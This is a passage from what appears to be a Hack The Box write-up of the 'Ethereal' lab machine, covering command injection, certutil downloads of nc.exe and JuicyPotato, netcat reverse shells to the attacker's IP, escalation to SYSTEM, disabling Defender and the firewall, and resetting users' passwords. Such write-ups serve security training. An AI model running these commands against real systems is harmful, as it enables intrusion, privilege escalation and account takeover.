<p>Ok, so the webserver on port 80 is not running with the same user as port 8080.</p>

<p>After wasting a few more hours, I realized that AppLocker isn’t enabled for user <code class="language-plaintext highlighter-rouge">IIS</code>. I suspected that the outbound ports on the box would be firewalled so I used a boolean blind approach to test various commands. The following payload will ping my machine only if the preceding command has been successfully executed: <code class="language-plaintext highlighter-rouge">127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23</code>.</p>

<p>To test this, I first tried a command that I know will work: <code class="language-plaintext highlighter-rouge">127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~# tcpdump -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:02:19.817657 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 63, length 40
21:02:19.817712 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 63, length 40
21:02:20.777578 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 64, length 40
21:02:20.777608 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 64, length 40
21:02:21.768882 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 65, length 40
21:02:21.768933 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 65, length 40
21:02:22.919376 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 66, length 40
21:02:22.919408 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 66, length 40
</code></pre></div></div>

<p>We are getting pinged so it means the command was executed correctly.</p>

<p>Next, our target is <code class="language-plaintext highlighter-rouge">certutil.exe</code> so we can use it to download files.</p>

<p>First, I tested locally on my Windows machine if running certutil.exe without parameters returns a successful error code. I wanted to do this because I suspected there was an outbound firewall blocking some most ports.</p>

<p><img src="/assets/images/htb-writeup-ethereal/boolean1.png" alt=""></p>

<p>Then I verified that certutil.exe is not blocked now that we are running as IIS: <code class="language-plaintext highlighter-rouge">127.0.0.1 &amp;&amp; certutil.exe &amp;&amp; ping 10.10.14.23</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21:06:30.214884 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 71, length 40
21:06:30.214912 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 71, length 40
21:06:31.286151 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 72, length 40
21:06:31.286182 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 72, length 40
</code></pre></div></div>

<p>We’re getting pinged so the certutil.exe command didn’t error out.</p>

<p>While previously looking at the files and programs on the box, I found <code class="language-plaintext highlighter-rouge">c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe"</code> installed (and it wasn’t AppLocked for <code class="language-plaintext highlighter-rouge">alan</code> user either), so I used this to establish outbound sockets.</p>

<p>I modified the existing script to scan for the first 200 ports:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">200</span><span class="p">):</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">2.5</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"</span><span class="se">\"</span><span class="s">c:</span><span class="se">\\</span><span class="s">program files (x86)</span><span class="se">\\</span><span class="s">OpenSSL-v1.1.0</span><span class="se">\\</span><span class="s">bin</span><span class="se">\\</span><span class="s">openssl.exe</span><span class="se">\"</span><span class="s"> s_client -host 10.10.14.23 -port {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
        <span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p>I used Wireshark to look for incoming SYN packets and started the scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py
[...]
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 72
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 73
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 74
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 75
[...]
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 135
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 136
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 137
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 138
</code></pre></div></div>

<p>From the pcap, I identified inbound connections on port 73 and 136.</p>

<p><img src="/assets/images/htb-writeup-ethereal/wireshark.png" alt=""></p>

<p>Now, we just need to get netcat uploaded to the server and try to get a proper shell.</p>

<p>First, let’s start an HTTP listener on port 73 to host nc.exe, then issue <code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -split -f http://10.10.14.23:73/nc.exe c:\users\public\desktop\shortcuts\nc.exe</code></p>

<p>And finally, spawn a netcat connection with <code class="language-plaintext highlighter-rouge">c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 136</code></p>

<p>We finally got a shell!</p>

<p><img src="/assets/images/htb-writeup-ethereal/shell1.png" alt=""></p>

<h3 id="privesc">Privesc</h3>

<p>Our IIS user has <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> so we can probably do Rotten Potato.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv&gt;whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</code></pre></div></div>

<p>I used Juicy Potato from Decoder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;cd \users\public 
cd \users\public

c:\Users\Public&gt;cmd /c certutil.exe -urlcache -split -f http://10.10.14.23:73/JuicyPotato.exe JuicyPotato.exe

10/10/2018  02:40 AM    &lt;DIR&gt;          .
10/10/2018  02:40 AM    &lt;DIR&gt;          ..
06/25/2018  03:51 PM    &lt;DIR&gt;          Documents
07/03/2018  10:25 PM    &lt;DIR&gt;          Downloads
10/10/2018  02:40 AM           347,648 JuicyPotato.exe
07/16/2016  02:23 PM    &lt;DIR&gt;          Music
07/16/2016  02:23 PM    &lt;DIR&gt;          Pictures
07/16/2016  02:23 PM    &lt;DIR&gt;          Videos
</code></pre></div></div>

<p>Execute it, spawning yet another netcat:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\Public&gt;JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *
JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *                                                                                
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public&gt;
</code></pre></div></div>

<p>We got a shell as <code class="language-plaintext highlighter-rouge">nt authority\system</code>!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# nc -lvnp 73
listening on [any] 73 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.106] 49877
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre></div></div>

<p>Strange… we don’t have read access to the flags even though we are SYSTEM:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;cd \users\jorge\desktop
cd \users\jorge\desktop

C:\Users\jorge\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of C:\Users\jorge\Desktop

07/08/2018  11:20 PM    &lt;DIR&gt;          .
07/08/2018  11:20 PM    &lt;DIR&gt;          ..
07/04/2018  10:18 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,231,598,592 bytes free

C:\Users\jorge\Desktop&gt;type user.txt
type user.txt
Access is denied.
</code></pre></div></div>

<p>Looking at the flags, we see that the file is encrypted:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\users\jorge\desktop&gt; get-itemproperty -path user.txt  | Format-list -Property *
get-itemproperty -path user.txt  | Format-list -Property *


PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\users\jorge\deskto
                    p\user.txt
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\users\jorge\deskto
                    p
PSChildName       : user.txt
[...]
Attributes        : Archive, Encrypted
</code></pre></div></div>

<p>Same thing for the root.txt file in <code class="language-plaintext highlighter-rouge">c:\users\rupal\desktop\root.txt</code></p>

<p>I found some cert and private key files on the D: drive</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS D:\certs&gt; dir


    Directory: D:\certs


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         7/1/2018  10:26 PM            772 MyCA.cer                      
-a----         7/1/2018  10:26 PM           1196 MyCA.pvk
</code></pre></div></div>

<p>I thought of googling for ways to recover EFS encrypted files but instead I just YOLOed it:</p>

<p>Attack plan:</p>

<ul>
  <li>Disable Windows Defender</li>
  <li>Disable Firewall</li>
  <li>Change Rupal and Jorge’s passwords</li>
  <li>RDP in and steal their shit</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true

PS C:\&gt; NetSh Advfirewall set allprofiles state off
Ok.

PS C:\&gt; net users rupal Yoloed1234!
net users rupal Yoloed1234!
The command completed successfully.

PS C:\&gt; net users jorge Yoloed1234!
net users jorge Yoloed1234!
The command completed successfully.
</code></pre></div></div>

<p>Sweet, RDP is already running, no need to enable it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; netstat -an                
netstat -an                        
                                   
Active Connections                 
                                   
  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
</code></pre></div></div>

<p>At last, we can RDP and get the flags!!</p>

<p><img src="/assets/images/htb-writeup-ethereal/jorge.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-ethereal/rupal.png" alt=""></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#dns-exfiltration" class="page__taxonomy-item" rel="tag">dns exfiltration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#efs" class="page__taxonomy-item" rel="tag">efs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ms-dos" class="page__taxonomy-item" rel="tag">ms-dos</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#rotten-potato" class="page__taxonomy-item" rel="tag">rotten potato</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-09T00:00:00+01:00">March 09, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-access/" class="pagination--pager" title="Access - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-carrier/" class="pagination--pager" title="Carrier - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
